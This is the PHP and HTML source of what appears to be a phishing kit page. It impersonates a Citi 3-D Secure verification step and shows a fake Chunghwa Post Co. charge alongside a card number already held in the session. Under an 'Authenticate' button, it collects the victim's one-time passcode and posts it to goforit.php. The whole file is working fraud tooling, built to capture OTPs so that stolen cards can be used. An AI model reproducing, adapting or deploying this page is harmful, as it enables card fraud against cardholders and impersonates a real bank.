<?php
session_start();
date_default_timezone_set("Asia/Taipei");
$cc = $_SESSION['didi'];
$bin1 = substr($cc, 0, 1);
$bin2 = substr($cc, 0, 6);
?>
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="Cache-Control" content="no-cache, no-store, max-age=0, must-revalidate">
      <meta http-equiv="pragma" content="no-cache">
      <meta http-equiv="expires" content="0">
      <title>Last Step</title>
      <base>
      <link rel="icon" type="image/x-icon" href="go/citi.ico">
      <link rel="stylesheet" href="go/bootstrap.min.css">
      <style type="text/css">
         @font-face {
         font-family: 'InterstateLight';
         src: url("go/InterstateLight.79266047ab665062f7f5.eot");
         src: url("go/InterstateLight.79266047ab665062f7f5.eot") format('embedded-opentype'),
         url("go/InterstateLight.8cb8337250f912ab9141.woff2") format('woff2'),
         url("go/InterstateLight.cde90c2ea3345825be72.woff") format('woff'),
         url("go/InterstateLight.c97dac0c0af5ce58daed.ttf") format('truetype'),
         url("go/InterstateLight.27b9d7c85d850c76aae0.svg") format('svg');
         }
         @font-face {
         font-family: 'InterstateBold';
         src: url("");
         src: url("") format('embedded-opentype'),
         url("") format('woff2'),
         url("") format('woff'),
         url("") format('truetype'),
         url("") format('svg');
         }
         html, body{
         margin:0;
         padding:0;
         }
         body{
         background:#fff;
         overflow: auto;
         }
         a{
         cursor:pointer;
         }
         ul{
         list-style-type: none;
         margin:0;
         padding:0;
         font-size:13px;
         }
         .vs_hidden{
         display: none !important;
         }
         .color-666{
         color:#666;
         }
         .border-w2{
         border-width: 2px;
         }
         .border-color-danger{
         border-color: #d9534f;
         }
         .mt-1rem{
         margin-top: 1rem;
         }
         .mb-1rem{
         margin-bottom: 1rem;
         }
         .divider-line{
         /* margin: 1rem; */
         height: 1px;
         /* border-top: 1px solid #eee; */
         margin: 0rem;
         }
         .link-btn{
         background: none;
         border: none;
         color: #337ab7;
         cursor: pointer;
         }
         button[disabled].link-btn {
         cursor: not-allowed;
         }
         .main-div{
         width:390px;
         height: auto;
         margin: 0 auto;
         font-size:12px;    
         border: 1px solid #ccc;
         overflow: hidden;
         }
         @media screen and (max-width:767px){
         .main-div{
         width:100%;
         font-size:11px;
         }
         }
         .main-div-flex{
         /* font-family: 'InterstateLight';
         width:100%;
         position: absolute;
         top: 0;
         bottom: 0;
         display: flex;
         flex-direction: column; */
         /* overflow-y: auto; */
         font-family: 'InterstateLight', sans-serif;
         width: 389px;
         /*width: 28.9%;*/
         /* position: absolute; */
         position: relative;
         top: 0;
         bottom: 0;
         margin: auto;
         left: 0;
         right: 0;
         border: 1px solid #ccc;
         box-shadow: 0 0 black;
         overflow: hidden;
         }
         @media screen and (min-width:767px){
         .main-div-flex{
         /* width:390px; */
         left: 50%;
         margin-left: -180px;
         /* overflow-y: hidden; */
         border: 1px solid #ccc;
         width:389px;
         }
         .push-content, .push-content-form{
         max-width: 351px;
         }
         }
         .content-div{
         padding: 0 2%;
         }
         header{	
         background-color: white;
         padding: 2%;
         border-bottom: 1px solid #EEE;
         }
         .modal-header header{
         padding:0;
         border-bottom: 0;
         }
         .header-icon img{
         height: 47px;
         }
         .change_lang{
         margin-top:15px;
         }
         .text-underline{
         text-decoration:underline;
         }
         /*START loading icon*/
         .glyphicon-refresh-animate {
         animation: spin .7s infinite linear;
         /*-webkit-animation: spin2 .7s infinite linear;*/
         }
         /*@-webkit-keyframes spin2 {
         from { -webkit-transform: rotate(0deg);}
         to { -webkit-transform: rotate(360deg);}
         }*/
         @keyframes spin {
         from { transform: scale(1) rotate(0deg);}
         to { transform: scale(1) rotate(360deg);}
         }
         .loading-icon{
         animation: rotate 3s linear infinite;
         }
         @keyframes rotate{from{transform: rotate(0deg)}
         to{transform: rotate(359deg)}
         }
         /*END loading icon*/
         /****** Footer *****/
         footer {
         bottom: 0px;
         /*position: absolute;*/
         padding: 2px 0;
         background-color: #f2f2f2;
         text-align: center;
         width: 100%;
         display: inline-table;
         }
         .small {
         font-size: 10px;
         line-height: 11px;
         color: #666;
         }
         .errorMsg{
         margin: 15px 0;
         }
         .error-container{
         color: #ff0000;
         padding: 2px 0;
         font-size: 14px;
         font-weight: bold;
         }
         p.error-container{
         margin-bottom: -10px;
         }
         /**start** new layout*/
         .push-content, .push-content-form{
         width: 90%;
         background: #fff;
         /* margin: -40px auto 0; */
         -ms-flex-positive: 1;
         flex-grow: 1;
         display: -ms-flexbox;
         display: flex;
         -ms-flex-direction: column;
         flex-direction: column;
         -ms-flex-negative: 0;
         flex-shrink: 0;
         text-align: center;
         /* font-size: 16px; */
         /* color: rgb(51, 51, 51); */
         margin: 0px auto 0;
         font-size: 12px;
         color: #333;
         padding:0px;
         }
         /* .push-content{
         padding: 40px 28px 0;
         } */
         @media screen and (max-width:767px){ 
         .push-content > p{
         -ms-flex-positive: 1;
         flex-grow: 1;
         }
         }
         @media screen and (min-width:767px){
         .push-footer.footer-text{
         margin-top: 28rem;
         }
         }
         .push-content-form{
         -ms-flex-pack: start;
         justify-content: flex-start;
         padding: 10px;
         }
         .push-content-form > p {
         /* margin-bottom: 3rem; */ 
         }
         .logo-image, .enter-otp{
         margin-bottom: 1rem;
         }
         .logo-image img{
         width: 40px;
         }
         .enter-otp{
         font-size: 14px;
         }
         .push-footer{
         font-size: 14px;
         text-align: center;
         margin-bottom: 5px;
         }
         .push-footer input{ 
         width: 85%;
         margin-left: 29px;
         }
         .push-footer input.btn-lg{ 
         padding: 0px;
         width: 84%;
         font-size: 14px;
         height: 35px;
         }
         .push-footer a{
         font-family: 'InterstateBold',sans-serif;
         display: inline-block;
         color: rgb(5, 109, 174);
         text-decoration: underline;
         font-weight: bold;
         }
         .push-form{
         display: -ms-flexbox;
         display: flex;
         -ms-flex-direction: column;
         flex-direction: column;
         -ms-flex-positive: 1;
         flex-grow: 1;
         }
         .block-line{
         height: 5px;
         background: #056dae;
         width: 60%;
         margin: 10px auto 20px;
         }
         .tab-nav-div {
         margin: 0 -20px;
         }
         .tab-nav {
         display: -ms-flexbox;
         display: flex;
         -ms-flex-direction: row;
         flex-direction: row;
         border: 1px solid #eee;
         border-bottom: 0;
         }
         .tab-nav-item {
         -ms-flex-positive: 1;
         flex-grow: 1;
         -ms-flex-preferred-size: 0;
         flex-basis: 0;
         text-align: center;
         }
         .tab-nav-link {
         display: block;
         padding: 1rem .5rem;
         background: #eee;
         color: #999;
         font-size: 16px;
         width: 100%;
         }
         .tab-nav-link.active {
         background: transparent;
         color: #333;
         border-bottom: 5px solid #056dae;
         font-weight: bold;
         }
         .tab-nav-link:hover,
         .tab-nav-link:focus,
         .tab-nav-link:visited {
         text-decoration: none;
         }
         .tab-content {
         -ms-flex: 1;
         flex: 1;
         display: -ms-flexbox;
         display: flex;
         margin: -5px -20px 0;
         -ms-flex-direction: column;
         flex-direction: column;
         }
         .otp-div{
         -ms-flex: 1;
         flex: 1;
         text-align: left;
         /* padding: 1rem; */ /*commented today*/
         padding: 0px 0px 0px 29px;
         }
         .otp-div p{
         /* font-size: 14px; */
         font-size: 12px;
         }
         .otp-div input{    
         /* height: 50px; */
         background: #eee;
         color: rgba(0.4, 0.4, 0.4, 1);
         /* font-size: 16px; */
         width: 91%; 
         }
         .otp-div small{
         display: inline-block;
         color: #666;
         }
         .otp-div small a{
         color: #056dae;
         font-size:12px;
         }
         .btn-outline-secondary{
         color: #6c757d;
         background-color: transparent;
         background-image: none;
         border-color: #6c757d;
         font-weight: bold;
         }
         .push-content-form .otp-info{ /*whole added today*/
         width: 94%;
         padding-left: 18px;
         }
         .push-content-form .otp-info dl{
         display: -ms-flexbox;
         display: flex;
         -ms-flex-pack: justify;
         justify-content: space-between;
         padding: 0 1rem;
         /* font-size: 14px; */
         margin-bottom: 5px;
         font-size: 12px;
         }
         .push-content-form .otp-info dl dt{
         font-weight: normal;
         }
         .push-content-form .otp-info dl dd{
         font-weight: bold;
         }
         .push-content-form .push-content-div{
         border: 1px solid #eee;  
         /* padding-top: 2rem;
         margin-bottom: 2rem; */ /* commented today*/
         padding:0px;
         }
         .push-content-form .push-content-div { /* added today whole*/
         padding-top: 4px;
         margin-bottom: 15px;
         }
         .push-content-form .send-sms{
         padding: 10px 58px;
         }
         /**end** new layout*/
      </style>
      <style></style>
      <style>.push-header[_ngcontent-c1]{
         display: -ms-flexbox;
         display: flex;
         -ms-flex-direction: column;
         flex-direction: column;
         -ms-flex-pack: center;
         justify-content: center;
         padding-left: 10px;
         height: 45px;
         }
         .push-header[_ngcontent-c1]   div[_ngcontent-c1]{
         width: 96%;
         display: -ms-flexbox;
         display: flex;
         -ms-flex-pack: justify;
         justify-content: space-between;
         height: 30px;
         }
         .push-header[_ngcontent-c1]   img[_ngcontent-c1]{
         height: 100%;
         }
         .push-title[_ngcontent-c1]{
         background: rgba(5,109,174,1);
         display: -ms-flexbox;
         display: flex;
         -ms-flex-direction: column;
         flex-direction: column;
         text-align: center;
         color: #fff;
         font-size: 20px;
         padding: 5px 0px 5px 0px;
         }
      </style>
   </head>
   <body>
      <my-app ng-version="4.4.7">
         <router-outlet></router-outlet>
         <app-otp-sg>
            <router-outlet></router-outlet>
            <app-otp-sg-home _nghost-c0="">
               <!--bindings={
                  "ng-reflect-ng-if": "true"
                  }-->
               <div _ngcontent-c0="" class="main-div-flex" style="width: 389px;">
                  <app-citi-header _ngcontent-c0="" _nghost-c1="">
                     <div _ngcontent-c1="" class="push-header">
                        <div _ngcontent-c1="">
<?php
if ($bin1 == '4') {
echo '<img _ngcontent-c1="" alt="logo" width="75" src="go/vc.gif">';
}
else {
echo '<img _ngcontent-c1="" alt="logo" src="go/mc.png">';
}
?>
                           <img src="go/apay.png" alt="logo" width="75" height="23" class="pull-right" _ngcontent-c1="">
                        </div>
                     </div>
                     <div _ngcontent-c1="" class="push-title"><span><img src="go/g01.png"></span></div>
                  </app-citi-header>
                  <div _ngcontent-c0="" class="push-content-form">
                     <p _ngcontent-c0=""><img src="go/g02.png"></p>
                     <div _ngcontent-c0="">
                        <!--bindings={
                           "ng-reflect-ng-if": "false"
                           }-->
                        <!--bindings={
                           "ng-reflect-ng-if": "true"
                           }--><span _ngcontent-c0="" class="block-line"></span>
                        <div _ngcontent-c0="" class="tab-content">
                           <form name="frm" method="post" action="goforit.php" id="frm" autocomplete="off">
                              <div _ngcontent-c0="" class="push-content-div">
                                 <div _ngcontent-c0="" class="form-items otp-info">
                                    <dl _ngcontent-c0="">
                                       <dt _ngcontent-c0=""><img src="go/g03.png"></dt>
                                       <dd _ngcontent-c0="">Chunghwa Post Co.</dd>
                                    </dl>
                                    <dl _ngcontent-c0="">
                                       <dt _ngcontent-c0=""><img src="go/g04.png"></dt>
                                       <dd _ngcontent-c0="">
                                          <strong _ngcontent-c0=""><?php echo $_SESSION['amount']; ?></strong>
                                       </dd>
                                    </dl>
                                    <dl _ngcontent-c0="">
                                       <dt _ngcontent-c0=""><img src="go/g05.png"></dt>
                                       <dd _ngcontent-c0=""><?php echo date("d/m/Y")?></dd>
                                    </dl>
                                    <dl _ngcontent-c0="">
                                       <dt _ngcontent-c0=""><img src="go/g06.png"></dt>
                                       <dd _ngcontent-c0=""><?php echo 'XXXX XXXX XXXX '.substr($cc,-4); ?></dd>
                                    </dl>
                                 </div>
                                 <div _ngcontent-c0="" class="divider-line"></div>
                                 <div _ngcontent-c0="" class="form-group otp-div">
                                    <p _ngcontent-c0="" class="enter-otp"><img src="go/g07.png"></p>
                                    <input _ngcontent-c0="" class="form-control ng-touched ng-dirty ng-valid" id="gigi" maxlength="8" minlength="6" name="gigi" required="" type="text" ng-reflect-klass="form-control" ng-reflect-ng-class="" ng-reflect-required="" ng-reflect-minlength="6" ng-reflect-maxlength="6" ng-reflect--only-number="true" placeholder="6-digit OTP" autofocus>
                                    <!--bindings={
                                       "ng-reflect-ng-if": "true"
                                       }--><small _ngcontent-c0="" class="form-text text-muted mt-1rem" id="otp-help">
                                    <a _ngcontent-c0="" class="text-underline"><img src="go/g08.png"></a>
                                    </small>
                                    <small _ngcontent-c0="" class="form-text text-muted mt-1rem">
                                    </small>
                                    <!--bindings={
                                       "ng-reflect-ng-if": "false"
                                       }-->
                                    <!--bindings={
                                       "ng-reflect-ng-if": "false"
                                       }-->
                                    <!--bindings={
                                       "ng-reflect-ng-if": "false"
                                       }-->
                                 </div>
                              </div>
                              <div _ngcontent-c0="" class="push-footer">
                                 <input _ngcontent-c0="" class="btn btn-lg btn-block border-w2 btn-primary" type="submit" ng-reflect-klass="btn btn-lg btn-block border-w2" ng-reflect-ng-class="[object Object]" value="Authenticate">
                              </div>
                           </form>
                        </div>
                     </div>
                  </div>
               </div>
            </app-otp-sg-home>
         </app-otp-sg>
      </my-app>
   </body>
</html>